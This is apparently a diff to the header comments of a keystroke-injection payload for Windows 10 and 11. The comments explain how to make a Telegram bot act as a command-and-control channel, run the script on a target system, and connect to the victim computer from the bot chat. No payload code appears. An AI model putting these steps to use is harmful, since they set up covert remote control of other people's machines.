@@ -5,13 +5,13 @@ REM Description: Using a Telegram Bot's Chat to Act as a Command and Control Pla
 REM Target: Windows 10 and 11
 
 REM SETUP INSTRUCTIONS
-REM 1. visit https://t.me/botfather and make a bot.
-REM 2. click provided link to open the chat E.G. "t.me/****bot" then type or click /start)
-REM 3. And add the provided bot api token to the script.
-REM 4. Run Script on target System
+REM 1. Install Telegram and make an account if you haven't already.
+REM 2. Visit https://t.me/botfather and make a bot. (make a note of the API token)
+REM 3. Click the provided link to open the chat E.G. "t.me/****bot" then type or click /start)
+REM 4. Run the script on target system
 REM 5. Check telegram chat for 'waiting to connect' message.
-REM 6. this script has a feature to wait until you start the session from telegram.
-REM 7. type in the computer name from that message into telegram bot chat to connect to that computer.
+REM 6. This script has a feature to wait until you start the session from Telegram.
+REM 7. Type the computer name from the 'waiting' message into Telegram bot chat to connect to that computer.
 REM 8. Replace TELEGRAM_BOT_API_TOKEN_HERE Below with your Telegram Bot API Token
 
 REM some setup for dukie script
